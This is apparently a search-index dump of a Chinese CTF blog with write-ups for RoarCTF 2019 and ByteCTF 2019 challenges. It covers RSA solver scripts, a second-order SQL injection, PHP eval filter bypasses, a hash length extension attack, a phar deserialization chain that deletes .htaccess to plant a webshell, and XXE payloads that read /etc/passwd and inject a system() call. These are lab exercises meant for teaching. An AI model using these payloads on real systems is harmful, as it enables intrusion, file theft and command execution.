由于只对\u0026rsquo;file\u0026rsquo;文件做判断, 所以一旦上传多个文件就可以绕过,然后根据文件名的生成方式来爆破php文件位置.\ncrypto RSA 题目给出了条件\nn=117930806043507374325982291823027285148807239117987369609583515353889814856088099671454394340816761242974462268435911765045576377767711593100416932019831889059333166946263184861287975722954992219766493089630810876984781113645362450398009234556085330943125568377741065242183073882558834603430862598066786475299918395341014877416901185392905676043795425126968745185649565106322336954427505104906770493155723995382318346714944184577894150229037758434597242564815299174950147754426950251419204917376517360505024549691723683358170823416757973059354784142601436519500811159036795034676360028928301979780528294114933347127L e=0x10001 (((y%x)**5)%(x%y))**2019+y**316+(y+1)/x=2683349182678714524247469512793476009861014781004924905484127480308161377768192868061561886577048646432382128960881487463427414176114486885830693959404989743229103516924432512724195654425703453612710310587164417035878308390676612592848750287387318129424195208623440294647817367740878211949147526287091298307480502897462279102572556822231669438279317474828479089719046386411971105448723910594710418093977044179949800373224354729179833393219827789389078869290217569511230868967647963089430594258815146362187250855166897553056073744582946148472068334167445499314471518357535261186318756327890016183228412253724L p=gmpy2.next_prime(x*y*z) q=gmpy2.next_prime(z) c=104691362123417589582551926531991781182010115901906985242039858907478735399784169051363443219315680244232603533899657231603732323266992359436518422851277069852793135320396586515487921637920627272606974731853791181271097899570276732277312961775278934241404863519840373617638621536398209255347566027214411203044623463749518663685607627212717097166124505123129373333338412199099199928067759937853247401620571810107903873489834435586333677991755979431408011776165868218508677566291652682933956103976791630704584853343422052444254468560250747030329091301992578584871488469381826293759687914010014083275135171832587631422L 因为\n2**(2019) \u0026gt; 26833491826787145242474...1422L 所以\n((y%x)**5)%(x%y) = 1 或者 0 所以将这项忽略,再将(y+1)/x忽略\ny 约等于26833491826787145242474...1422L的316次方 y 约等于83 然后(y+1)/x 必须为整数 ,结合上述条件可以轻易求得x=2.y=83\n接下来\np = xyz + a q = z + b xyzz + xyzb + az + ab = n 忽略ab, az, xyzb, 求出z的近似值,然后这个值肯定比真实的z要大, 因此可以根据这个值循环减一带入运算来爆破p ,求出的p如果可以整除n就停下.\nimport gmpy2 from Crypto.Util import number n=117930806043507374325982291823027285148807239117987369609583515353889814856088099671454394340816761242974462268435911765045576377767711593100416932019831889059333166946263184861287975722954992219766493089630810876984781113645362450398009234556085330943125568377741065242183073882558834603430862598066786475299918395341014877416901185392905676043795425126968745185649565106322336954427505104906770493155723995382318346714944184577894150229037758434597242564815299174950147754426950251419204917376517360505024549691723683358170823416757973059354784142601436519500811159036795034676360028928301979780528294114933347127L e=0x10001 c=104691362123417589582551926531991781182010115901906985242039858907478735399784169051363443219315680244232603533899657231603732323266992359436518422851277069852793135320396586515487921637920627272606974731853791181271097899570276732277312961775278934241404863519840373617638621536398209255347566027214411203044623463749518663685607627212717097166124505123129373333338412199099199928067759937853247401620571810107903873489834435586333677991755979431408011776165868218508677566291652682933956103976791630704584853343422052444254468560250747030329091301992578584871488469381826293759687914010014083275135171832587631422L # x=2 # y = 83 # z_close = gmpy2.iroot(n//166, 2) z_close = 842868045681390934539739959201847552284980179958879667933078453950968566151662147267006293571765463137270594151138695778986165111380428806545593588078365331313084230014618714412959584843421586674162688321942889369912392031882620994944241987153078156389470370195514285850736541078623854327959382156753458023 while True: p_close = gmpy2.next_prime(166*z_close) if n % p_close == 0: p = p_close q = n // p break z_close -= 1 # p = 139916095583110895133596833227506693679306709873174024876891023355860781981175916446323044732913066880786918629089023499311703408489151181886568535621008644997971982182426706592551291084007983387911006261442519635405457077292515085160744169867410973960652081452455371451222265819051559818441257438021073941183 # q = 842868045681390934539739959201847552284980179958879667933078453950968566151662147267006293571765463137270594151138695778986165111380428806545593588078365331313084230014618714412959584843421586674162688321942889369912392031882620994944241987153078156389470370195514285850736541078623854327959382156753458569 phi = (p-1) * (q-1) d = gmpy2.invert(e, phi) print number.long_to_bytes(pow(c,d,n)) babyrsa import sympy import random def myGetPrime(): A= getPrime(513) print(A) B=A-random.randint(1e3,1e5) print(B) return sympy.nextPrime((B!)%A) p=myGetPrime() #A1=21856963452461630437348278434191434000066076750419027493852463513469865262064340836613831066602300959772632397773487317560339056658299954464169264467234407 #B1=21856963452461630437348278434191434000066076750419027493852463513469865262064340836613831066602300959772632397773487317560339056658299954464169264467140596 q=myGetPrime() #A2=16466113115839228119767887899308820025749260933863446888224167169857612178664139545726340867406790754560227516013796269941438076818194617030304851858418927 #B2=16466113115839228119767887899308820025749260933863446888224167169857612178664139545726340867406790754560227516013796269941438076818194617030304851858351026 r=myGetPrime() n=p*q*r #n=85492663786275292159831603391083876175149354309327673008716627650718160585639723100793347534649628330416631255660901307533909900431413447524262332232659153047067908693481947121069070451562822417357656432171870951184673132554213690123308042697361969986360375060954702920656364144154145812838558365334172935931441424096270206140691814662318562696925767991937369782627908408239087358033165410020690152067715711112732252038588432896758405898709010342467882264362733 c=pow(flag,e,n) #e=0x1001 #c=75700883021669577739329316795450706204502635802310731477156998834710820770245219468703245302009998932067080383977560299708060476222089630209972629755965140317526034680452483360917378812244365884527186056341888615564335560765053550155758362271622330017433403027261127561225585912484777829588501213961110690451987625502701331485141639684356427316905122995759825241133872734362716041819819948645662803292418802204430874521342108413623635150475963121220095236776428 #so,what is the flag? 直接求b的阶乘是不可能的,递归达到最大限制次数也求不出来.\n这里要用到威尔逊定理\n判定一个数字是素数的充分必要条件:\n(p-1)! = -1 (mod p)\n在这套题中可以发现(-1)(A-1)(A-2)...(B+2)(B+1)是B! 关于A的逆元,然后就好求了\nimport gmpy2 import sympy from Crypto.Util import number def myprime(a, b): ans = 1 for i in range(b+1, a): ans = (ans *i) % a ans = -1 * ans num = gmpy2.invert(ans ,a) return sympy.nextprime(num) A1=21856963452461630437348278434191434000066076750419027493852463513469865262064340836613831066602300959772632397773487317560339056658299954464169264467234407 B1=21856963452461630437348278434191434000066076750419027493852463513469865262064340836613831066602300959772632397773487317560339056658299954464169264467140596 p = myprime(A1, B1) A2=16466113115839228119767887899308820025749260933863446888224167169857612178664139545726340867406790754560227516013796269941438076818194617030304851858418927 B2=16466113115839228119767887899308820025749260933863446888224167169857612178664139545726340867406790754560227516013796269941438076818194617030304851858351026 q = myprime(A2, B2) n=85492663786275292159831603391083876175149354309327673008716627650718160585639723100793347534649628330416631255660901307533909900431413447524262332232659153047067908693481947121069070451562822417357656432171870951184673132554213690123308042697361969986360375060954702920656364144154145812838558365334172935931441424096270206140691814662318562696925767991937369782627908408239087358033165410020690152067715711112732252038588432896758405898709010342467882264362733 enc=75700883021669577739329316795450706204502635802310731477156998834710820770245219468703245302009998932067080383977560299708060476222089630209972629755965140317526034680452483360917378812244365884527186056341888615564335560765053550155758362271622330017433403027261127561225585912484777829588501213961110690451987625502701331485141639684356427316905122995759825241133872734362716041819819948645662803292418802204430874521342108413623635150475963121220095236776428 r = n /(p*q) e=0x1001 phi = (p-1)*(q-1)*(r-1) d = gmpy2.invert(e, phi) m = pow(enc, d, n) print number.long_to_bytes(m) ","permalink":"https://ch3n9w.github.io/posts/ctf-roarctfwp/","summary":"\u003ch1 id=\"web\"\u003eweb\u003c/h1\u003e\n\u003ch2 id=\"online_proxy\"\u003eonline_proxy\u003c/h2\u003e\n\u003cp\u003e特征: 第一次登录后源代码内容有如下:\u003c/p\u003e\n\u003cp\u003e\u003cimg loading=\"lazy\" src=\"image-20211114142027467.png\" alt=\"image-20211114142027467\"  /\u003e\n\u003c/p\u003e\n\u003cp\u003e换一个\u003cstrong\u003eX-Forwarded-For\u003c/strong\u003e 后会发现currentip是根据xff判别的\u003c/p\u003e\n\u003cp\u003e\u003cimg loading=\"lazy\" src=\"image-20211114142033017.png\" alt=\"image-20211114142033017\"  /\u003e\n\u003c/p\u003e\n\u003cp\u003e那么有理由认为上一个ip被存储进了数据库中,并在每次检测到访问ip和上一个ip不同的时候就会改变数据库. 源码这里也写到了\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" style=\"color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;\"\u003e\u003ccode class=\"language-php\" data-lang=\"php\"\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e$result \u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003e \u003cspan style=\"color:#a6e22e\"\u003equery\u003c/span\u003e(\u003cspan style=\"color:#e6db74\"\u003e\u0026#34;select current_ip, last_ip from ip_log where uuid = \u0026#39;\u0026#34;\u003c/span\u003e\u003cspan style=\"color:#f92672\"\u003e.\u003c/span\u003e\u003cspan style=\"color:#a6e22e\"\u003eaddslashes\u003c/span\u003e($uuid)\u003cspan style=\"color:#f92672\"\u003e.\u003c/span\u003e\u003cspan style=\"color:#e6db74\"\u003e\u0026#34;\u0026#39;\u0026#34;\u003c/span\u003e);\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#66d9ef\"\u003eif\u003c/span\u003e(\u003cspan style=\"color:#a6e22e\"\u003ecount\u003c/span\u003e($result) \u003cspan style=\"color:#f92672\"\u003e\u0026gt;\u003c/span\u003e \u003cspan style=\"color:#ae81ff\"\u003e0\u003c/span\u003e) {\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e    \u003cspan style=\"color:#66d9ef\"\u003eif\u003c/span\u003e($ip \u003cspan style=\"color:#f92672\"\u003e!==\u003c/span\u003e $result[\u003cspan style=\"color:#ae81ff\"\u003e0\u003c/span\u003e][\u003cspan style=\"color:#e6db74\"\u003e\u0026#39;current_ip\u0026#39;\u003c/span\u003e]) {\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e        $last_ip \u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003e $result[\u003cspan style=\"color:#ae81ff\"\u003e0\u003c/span\u003e][\u003cspan style=\"color:#e6db74\"\u003e\u0026#39;current_ip\u0026#39;\u003c/span\u003e];\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e        \u003cspan style=\"color:#a6e22e\"\u003equery\u003c/span\u003e(\u003cspan style=\"color:#e6db74\"\u003e\u0026#34;delete from ip_log where uuid=\u0026#39;\u0026#34;\u003c/span\u003e\u003cspan style=\"color:#f92672\"\u003e.\u003c/span\u003e\u003cspan style=\"color:#a6e22e\"\u003eaddslashes\u003c/span\u003e($uuid)\u003cspan style=\"color:#f92672\"\u003e.\u003c/span\u003e\u003cspan style=\"color:#e6db74\"\u003e\u0026#34;\u0026#39;\u0026#34;\u003c/span\u003e);\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e    } \u003cspan style=\"color:#66d9ef\"\u003eelse\u003c/span\u003e {\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e        $last_ip \u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003e $result[\u003cspan style=\"color:#ae81ff\"\u003e0\u003c/span\u003e][\u003cspan style=\"color:#e6db74\"\u003e\u0026#39;last_ip\u0026#39;\u003c/span\u003e];\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e    }\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e}\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#a6e22e\"\u003equery\u003c/span\u003e(\u003cspan style=\"color:#e6db74\"\u003e\u0026#34;insert into ip_log values (\u0026#39;\u0026#34;\u003c/span\u003e\u003cspan style=\"color:#f92672\"\u003e.\u003c/span\u003e\u003cspan style=\"color:#a6e22e\"\u003eaddslashes\u003c/span\u003e($uuid)\u003cspan style=\"color:#f92672\"\u003e.\u003c/span\u003e\u003cspan style=\"color:#e6db74\"\u003e\u0026#34;\u0026#39;, \u0026#39;\u0026#34;\u003c/span\u003e\u003cspan style=\"color:#f92672\"\u003e.\u003c/span\u003e\u003cspan style=\"color:#a6e22e\"\u003eaddslashes\u003c/span\u003e($ip)\u003cspan style=\"color:#f92672\"\u003e.\u003c/span\u003e\u003cspan style=\"color:#e6db74\"\u003e\u0026#34;\u0026#39;, \u0026#39;\u003c/span\u003e\u003cspan style=\"color:#e6db74\"\u003e$last_ip\u003c/span\u003e\u003cspan style=\"color:#e6db74\"\u003e\u0026#39;);\u0026#34;\u003c/span\u003e);\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#66d9ef\"\u003edie\u003c/span\u003e(\u003cspan style=\"color:#e6db74\"\u003e\u0026#34;\u003c/span\u003e\u003cspan style=\"color:#ae81ff\"\u003e\\n\u003c/span\u003e\u003cspan style=\"color:#e6db74\"\u003e\u0026lt;!-- Debug Info: \u003c/span\u003e\u003cspan style=\"color:#ae81ff\"\u003e\\n\u003c/span\u003e\u003cspan style=\"color:#e6db74\"\u003e Duration: \u003c/span\u003e\u003cspan style=\"color:#e6db74\"\u003e$time\u003c/span\u003e\u003cspan style=\"color:#e6db74\"\u003e s \u003c/span\u003e\u003cspan style=\"color:#ae81ff\"\u003e\\n\u003c/span\u003e\u003cspan style=\"color:#e6db74\"\u003e Current Ip: \u003c/span\u003e\u003cspan style=\"color:#e6db74\"\u003e$ip\u003c/span\u003e\u003cspan style=\"color:#e6db74\"\u003e \u0026#34;\u003c/span\u003e\u003cspan style=\"color:#f92672\"\u003e.\u003c/span\u003e($last_ip \u003cspan style=\"color:#f92672\"\u003e!==\u003c/span\u003e \u003cspan style=\"color:#e6db74\"\u003e\u0026#34;\u0026#34;\u003c/span\u003e \u003cspan style=\"color:#f92672\"\u003e?\u003c/span\u003e \u003cspan style=\"color:#e6db74\"\u003e\u0026#34;\u003c/span\u003e\u003cspan style=\"color:#ae81ff\"\u003e\\n\u003c/span\u003e\u003cspan style=\"color:#e6db74\"\u003eLast Ip: \u0026#34;\u003c/span\u003e\u003cspan style=\"color:#f92672\"\u003e.\u003c/span\u003e$last_ip \u003cspan style=\"color:#f92672\"\u003e:\u003c/span\u003e \u003cspan style=\"color:#e6db74\"\u003e\u0026#34;\u0026#34;\u003c/span\u003e)\u003cspan style=\"color:#f92672\"\u003e.\u003c/span\u003e\u003cspan style=\"color:#e6db74\"\u003e\u0026#34; --\u0026gt;\u0026#34;\u003c/span\u003e);\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cp\u003e解法:\u003c/p\u003e\n\u003cp\u003e先用\u003ccode\u003e1'|1|'1\u003c/code\u003e作为xff访问网站网站 , 访问成功之后改变xff, 再次访问, 这个时候由于前后xff不一致, 原来存储进数据库currentip的ip被重新提取出来存进lastip项中, 如果这个lastip没有过滤的话,就可以造成\u003cstrong\u003e二次注入\u003c/strong\u003e, 事实上也确实如此, 但这个可能得猜\u0026hellip;\u0026hellip;在第二次访问之后, payload被重新插入进数据库中, 带着第二次访问的xff来第三次访问这个网站,可以看到\u003c/p\u003e","title":"RoarCTF 2019复现"},{"content":"boring code source code\n\u0026lt;?php function is_valid_url($url) { if (filter_var($url, FILTER_VALIDATE_URL)) { if (preg_match(\u0026#39;/data:\\/\\//i\u0026#39;, $url)) { return false; } return true; } return false; } if (isset($_POST[\u0026#39;url\u0026#39;])){ $url = $_POST[\u0026#39;url\u0026#39;]; if (is_valid_url($url)) { $r = parse_url($url); if (preg_match(\u0026#39;/baidu\\.com$/\u0026#39;, $r[\u0026#39;host\u0026#39;])) { $code = file_get_contents($url); if (\u0026#39;;\u0026#39; === preg_replace(\u0026#39;/[a-z]+\\((?R)?\\)/\u0026#39;, NULL, $code)) { if (preg_match(\u0026#39;/et|na|nt|strlen|info|path|rand|dec|bin|hex|oct|pi|exp|log/i\u0026#39;, $code)) { echo \u0026#39;bye~\u0026#39;; } else { eval($code); } } } else { echo \u0026#34;error: host not allowed\u0026#34;; } } else { echo \u0026#34;error: invalid url\u0026#34;; } }else{ highlight_file(__FILE__); } 思路: 注册一个xxxxbaidu.com 形式的域名.绑定到服务器上后放上自己的代码,payload\nif(chdir(next(scandir(chr(ord(strrev(crypt(serialize(array())))))))))readfile(end(scandir(chr(ord(strrev(crypt(serialize(array())))))))); echo(readfile(end(scandir(chr(pos(localtime(time(chdir(next(scandir(current(localeconv())))))))))))); 这两个payload都很精彩, 涉及的知识点如下:\ncrypt 函数没有key的时候随机生成key进行加密, 如果多尝试几次加密的话就会发现有几次的加密结果中的末尾有点号.\nord函数传入字符串的时候, 只返回第一个字符的ascii码\nlocaleconv函数返回一组包含本地数字和货币格式的数组, 数组第一位是\u0026quot;小数点字符\u0026quot;, 也就是点号\nphp \u0026gt; var_dump(localeconv()); array(18) { [\u0026#34;decimal_point\u0026#34;]=\u0026gt; string(1) \u0026#34;.\u0026#34; [\u0026#34;thousands_sep\u0026#34;]=\u0026gt; string(0) \u0026#34;\u0026#34; [\u0026#34;int_curr_symbol\u0026#34;]=\u0026gt; string(0) \u0026#34;\u0026#34; [\u0026#34;currency_symbol\u0026#34;]=\u0026gt; string(0) \u0026#34;\u0026#34; [\u0026#34;mon_decimal_point\u0026#34;]=\u0026gt; string(0) \u0026#34;\u0026#34; [\u0026#34;mon_thousands_sep\u0026#34;]=\u0026gt; string(0) \u0026#34;\u0026#34; [\u0026#34;positive_sign\u0026#34;]=\u0026gt; string(0) \u0026#34;\u0026#34; [\u0026#34;negative_sign\u0026#34;]=\u0026gt; string(0) \u0026#34;\u0026#34; [\u0026#34;int_frac_digits\u0026#34;]=\u0026gt; int(127) [\u0026#34;frac_digits\u0026#34;]=\u0026gt; int(127) [\u0026#34;p_cs_precedes\u0026#34;]=\u0026gt; int(127) [\u0026#34;p_sep_by_space\u0026#34;]=\u0026gt; int(127) [\u0026#34;n_cs_precedes\u0026#34;]=\u0026gt; int(127) [\u0026#34;n_sep_by_space\u0026#34;]=\u0026gt; int(127) [\u0026#34;p_sign_posn\u0026#34;]=\u0026gt; int(127) [\u0026#34;n_sign_posn\u0026#34;]=\u0026gt; int(127) [\u0026#34;grouping\u0026#34;]=\u0026gt; array(0) { } [\u0026#34;mon_grouping\u0026#34;]=\u0026gt; array(0) { } } php \u0026gt; pos() 函数是current函数的别名\ntime() 返回时间戳整数, 从中无法提出点号\nlocaltime第一参数默认是time(), 不能接受布尔值也就是chdir的返回值\nlocaltime() 返回数组来表示当前时间, 第一项是当前的秒数, 要让chr转换成点号的话就要在第46秒执行\nezCMS 源码www.zip, 关键代码如下:\n身份验证部分\nfunction login(){ $secret = \u0026#34;********\u0026#34;; setcookie(\u0026#34;hash\u0026#34;, md5($secret.\u0026#34;adminadmin\u0026#34;)); return 1; } function is_admin(){ $secret = \u0026#34;********\u0026#34;; $username = $_SESSION[\u0026#39;username\u0026#39;]; $password = $_SESSION[\u0026#39;password\u0026#39;]; if ($username == \u0026#34;admin\u0026#34; \u0026amp;\u0026amp; $password != \u0026#34;admin\u0026#34;){ if ($_COOKIE[\u0026#39;user\u0026#39;] === md5($secret.$username.$password)){ return 1; } } return 0; } 可以明显看出这里有哈希长度扩展攻击.\n哈希生成\n./hash_extender -d \u0026#39;admin\u0026#39; -s 52107b08c0f3342d2153ae1d68e6262c -f md5 -a \u0026#39;ch3n9w\u0026#39; --out-data-format=html -l 13 --quiet 得到了新的哈希值,添加到cookie[user]中\n然后新的登录用户名: admin\n用户密码:admin%80%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%90%00%00%00%00%00%00%00ch3n9w\n第二部分反序列化代码审计.\nclass Check{ public $filename; function __construct($filename) { $this-\u0026gt;filename = $filename; } function check(){ $content = file_get_contents($this-\u0026gt;filename); $black_list = [\u0026#39;system\u0026#39;,\u0026#39;eval\u0026#39;,\u0026#39;exec\u0026#39;,\u0026#39;+\u0026#39;,\u0026#39;passthru\u0026#39;,\u0026#39;`\u0026#39;,\u0026#39;assert\u0026#39;]; foreach ($black_list as $k=\u0026gt;$v){ if (stripos($content, $v) !== false){ die(\u0026#34;your file make me scare\u0026#34;); } } return 1; } } class File{ public $filename; public $filepath; public $checker; function __construct($filename, $filepath) { $this-\u0026gt;filepath = $filepath; $this-\u0026gt;filename = $filename; } public function view_detail(){ if (preg_match(\u0026#39;/^(phar|compress|compose.zlib|zip|rar|file|ftp|zlib|data|glob|ssh|expect)/i\u0026#39;, $this-\u0026gt;filepath)){ die(\u0026#34;nonono~\u0026#34;); } $mine = mime_content_type($this-\u0026gt;filepath); $store_path = $this-\u0026gt;open($this-\u0026gt;filename, $this-\u0026gt;filepath); $res[\u0026#39;mine\u0026#39;] = $mine; $res[\u0026#39;store_path\u0026#39;] = $store_path; return $res; } public function open($filename, $filepath){ $res = \u0026#34;$filename is in $filepath\u0026#34;; return $res; } function __destruct() { if (isset($this-\u0026gt;checker)){ $this-\u0026gt;checker-\u0026gt;upload_file(); } } } class Admin{ public $size; public $checker; public $file_tmp; public $filename; public $upload_dir; public $content_check; function __construct($filename, $file_tmp, $size) { $this-\u0026gt;upload_dir = \u0026#39;sandbox/\u0026#39;.md5($_SERVER[\u0026#39;REMOTE_ADDR\u0026#39;]); if (!file_exists($this-\u0026gt;upload_dir)){ mkdir($this-\u0026gt;upload_dir, 0777, true); } if (!is_file($this-\u0026gt;upload_dir.\u0026#39;/.htaccess\u0026#39;)){ file_put_contents($this-\u0026gt;upload_dir.\u0026#39;/.htaccess\u0026#39;, \u0026#39;lolololol, i control all\u0026#39;); } $this-\u0026gt;size = $size; $this-\u0026gt;filename = $filename; $this-\u0026gt;file_tmp = $file_tmp; $this-\u0026gt;content_check = new Check($this-\u0026gt;file_tmp); $profile = new Profile(); $this-\u0026gt;checker = $profile-\u0026gt;is_admin(); } public function upload_file(){ if (!$this-\u0026gt;checker){ die(\u0026#39;u r not admin\u0026#39;); } $this-\u0026gt;content_check -\u0026gt; check(); $tmp = explode(\u0026#34;.\u0026#34;, $this-\u0026gt;filename); $ext = end($tmp); if ($this-\u0026gt;size \u0026gt; 204800){ die(\u0026#34;your file is too big\u0026#34;); } move_uploaded_file($this-\u0026gt;file_tmp, $this-\u0026gt;upload_dir.\u0026#39;/\u0026#39;.md5($this-\u0026gt;filename).\u0026#39;.\u0026#39;.$ext); } public function __call($name, $arguments) { } } class Profile{ public $username; public $password; public $admin; public function is_admin(){ $this-\u0026gt;username = $_SESSION[\u0026#39;username\u0026#39;]; $this-\u0026gt;password = $_SESSION[\u0026#39;password\u0026#39;]; $secret = \u0026#34;********\u0026#34;; if ($this-\u0026gt;username === \u0026#34;admin\u0026#34; \u0026amp;\u0026amp; $this-\u0026gt;password != \u0026#34;admin\u0026#34;){ if ($_COOKIE[\u0026#39;user\u0026#39;] === md5($secret.$this-\u0026gt;username.$this-\u0026gt;password)){ return 1; } } return 0; } function __call($name, $arguments) { $this-\u0026gt;admin-\u0026gt;open($this-\u0026gt;username, $this-\u0026gt;password); } } 利用链:\n上传exp.phar 绕过waf使用php://filter/read=convert.base64-encode/resource=phar://exp.phar触发phar让他反序列中file类的destruct, upload_file触发profile的__call函数, 触发open函数 profile-\u0026gt;admin声明为ZipArchive类, 利用这个原生类的同名函数open来删除原有的.htaccess, 删除完之后再传一个shell就可以了 exp:\n\u0026lt;?php class File{ public $filename; public $filepath; public $checker; function __construct() { $this-\u0026gt;checker = new Admin(); } } class Admin{ public $size; public $checker; public $file_tmp; public $filename; public $upload_dir; public $file_error; public $content_check; public $obj; public $filepath; function __construct() { $this-\u0026gt;checker = 1; $this-\u0026gt;size = 1024; $this-\u0026gt;content_check = new Profile(); } } class Profile{ public $username; public $password; public $admin; function __construct() { $this-\u0026gt;admin = new ZipArchive(); $this-\u0026gt;username = \u0026#34;/var/www/html/sandbox/76c98b2e4f0f7a9a467bcf459b36ab5c/.htaccess\u0026#34;; $this-\u0026gt;password = ZipArchive::OVERWRITE; } } @unlink(\u0026#34;exp.phar\u0026#34;); $phar = new Phar(\u0026#39;exp.phar\u0026#39;); $phar -\u0026gt; startBuffering(); $phar -\u0026gt; setStub(\u0026#39;GIF89a\u0026#39;.\u0026#39;\u0026lt;?php __HALT_COMPILER();?\u0026gt;\u0026#39;); $phar -\u0026gt; addFromString(\u0026#39;test.txt\u0026#39;,\u0026#39;test\u0026#39;); $object = new File(); $phar -\u0026gt; setMetadata($object); $phar -\u0026gt; stopBuffering(); shell.php\n\u0026lt;?php echo file_get_contents(\u0026#39;/flag\u0026#39;); rss data protocol format:\ndata:[\u0026lt;mime type\u0026gt;][;charset=\u0026lt;charset\u0026gt;][;base64],\u0026lt;encoded data\u0026gt; 说是php对mine type不敏感, 那么可以这样子写\ndata://baidu.com/plain;base64,xxxxxxxxx== 然后看rss的定义:\nWhat is RSS?\nIt is a format to share data, defined in the 1.0 version of XML. You can deliver information in this format et one can get this information, and information from other various sources, in this format. Information provided by a website in an XML file is called an RSS feed. Recent browsers can read directly RSS files, but a special RSS reader or aggregator may be used too.\n所以所谓的rss就是xml.\n尝试测试\n\u0026lt;?xml version=\u0026#34;1.0\u0026#34; encoding=\u0026#34;UTF-8\u0026#34;?\u0026gt; \u0026lt;!DOCTYPE title [ \u0026lt;!ELEMENT title ANY \u0026gt; \u0026lt;!ENTITY xxe SYSTEM \u0026#34;file:///etc/passwd\u0026#34; \u0026gt;]\u0026gt; \u0026lt;rss version=\u0026#34;2.0\u0026#34; xmlns:atom=\u0026#34;http://www.w3.org/2005/Atom\u0026#34;\u0026gt; \u0026lt;channel\u0026gt; \u0026lt;title\u0026gt;The Blog\u0026lt;/title\u0026gt; \u0026lt;link\u0026gt;http://example.com/\u0026lt;/link\u0026gt; \u0026lt;description\u0026gt;A blog about things\u0026lt;/description\u0026gt; \u0026lt;lastBuildDate\u0026gt;Mon, 03 Feb 2014 00:00:00 -0000\u0026lt;/lastBuildDate\u0026gt; \u0026lt;item\u0026gt; \u0026lt;title\u0026gt;\u0026amp;xxe;\u0026lt;/title\u0026gt; \u0026lt;link\u0026gt;http://example.com\u0026lt;/link\u0026gt; \u0026lt;description\u0026gt;a post\u0026lt;/description\u0026gt; \u0026lt;author\u0026gt;author@example.com\u0026lt;/author\u0026gt; \u0026lt;pubDate\u0026gt;Mon, 03 Feb 2014 00:00:00 -0000\u0026lt;/pubDate\u0026gt; \u0026lt;/item\u0026gt; \u0026lt;/channel\u0026gt; \u0026lt;/rss\u0026gt; 将上述内容base64编码之后用之前的data协议传入进去, 触发成功.\n接下来就读取源码就行了.\n不熟悉MVC架构\u0026hellip;.读完index.php之后就不知道读什么\u0026hellip;..\nindex.php 中有routes.php, 根据routes.php再去读controllers/Admin.php, 然后又去读views/Admin.php\n然后关键代码\nusort($data, create_function(\u0026#39;$a, $b\u0026#39;, \u0026#39;return strcmp($a-\u0026gt;\u0026#39;.$order.\u0026#39;,$b-\u0026gt;\u0026#39;.$order.\u0026#39;);\u0026#39;)); 直接拼接\nexp.xml\n\u0026lt;?xml version=\u0026#34;1.0\u0026#34; encoding=\u0026#34;UTF-8\u0026#34;?\u0026gt; \u0026lt;!DOCTYPE title [ \u0026lt;!ELEMENT title ANY \u0026gt; \u0026lt;!ENTITY xxe SYSTEM \u0026#34;php://filter/read=convert.base64-encode/resource=http://127.0.0.1/rss_in_order?rss_url=https://view.news.qq.com/index2010/zhuanti/ztrss.xml\u0026amp;order=%24b%2C%24a)%3B%7Dsystem(\u0026#39;cat%20%2Fflag_eb8ba2eb07702e69963a7d6ab8669134\u0026#39;)%3B%2F%2F\u0026#34; \u0026gt;]\u0026gt; \u0026lt;rss version=\u0026#34;2.0\u0026#34; xmlns:atom=\u0026#34;http://www.w3.org/2005/Atom\u0026#34;\u0026gt; \u0026lt;channel\u0026gt; \u0026lt;title\u0026gt;The Blog\u0026lt;/title\u0026gt; \u0026lt;link\u0026gt;http://example.com/\u0026lt;/link\u0026gt; \u0026lt;description\u0026gt;A blog about things\u0026lt;/description\u0026gt; \u0026lt;lastBuildDate\u0026gt;Mon, 03 Feb 2014 00:00:00 -0000\u0026lt;/lastBuildDate\u0026gt; \u0026lt;item\u0026gt; \u0026lt;title\u0026gt;\u0026amp;xxe;\u0026lt;/title\u0026gt; \u0026lt;link\u0026gt;http://example.com\u0026lt;/link\u0026gt; \u0026lt;description\u0026gt;a post\u0026lt;/description\u0026gt; \u0026lt;author\u0026gt;author@example.com\u0026lt;/author\u0026gt; \u0026lt;pubDate\u0026gt;Mon, 03 Feb 2014 00:00:00 -0000\u0026lt;/pubDate\u0026gt; \u0026lt;/item\u0026gt; \u0026lt;/channel\u0026gt; \u0026lt;/rss\u0026gt; $b,$a);}system(\u0026#39;cat /flag_eb8ba2eb07702e69963a7d6ab8669134\u0026#39;);\u0026#34; ","permalink":"https://ch3n9w.github.io/posts/ctf-bytectf2019/","summary":"\u003ch2 id=\"boring-code\"\u003eboring code\u003c/h2\u003e\n\u003cp\u003esource code\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" style=\"color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;\"\u003e\u003ccode class=\"language-php\" data-lang=\"php\"\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#f92672\"\u003e\u0026lt;?\u003c/span\u003e\u003cspan style=\"color:#a6e22e\"\u003ephp\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#66d9ef\"\u003efunction\u003c/span\u003e \u003cspan 